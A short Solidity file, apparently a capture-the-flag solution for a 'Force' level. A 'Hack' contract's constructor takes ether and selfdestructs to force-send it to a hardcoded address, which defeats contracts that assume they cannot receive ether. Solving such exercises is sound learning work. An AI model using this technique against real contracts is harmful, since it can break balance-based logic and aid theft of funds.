// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }



contract Hack
{
    constructor() payable
    {
        require(msg.value>0,"paisa magnta ha re ba");
        selfdestruct(payable(0x56F003fF9957f186B37643F5e0d325AF311764d4)); //suicide
    }

}